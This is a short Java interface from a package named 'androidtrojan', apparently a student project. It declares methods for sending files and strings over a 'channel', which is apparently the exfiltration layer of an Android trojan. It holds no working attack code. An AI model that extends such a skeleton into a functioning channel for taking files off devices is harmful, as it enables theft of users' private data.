package il.ac.colman.androidtrojan.Channels;

public interface IFilesIncludedCommunication {
	// sending file trough channel:
	public void sendFile(String filePath, String fileName) throws Exception;

	// sending string trough channel:
	public void sendString(String text) throws Exception;

}
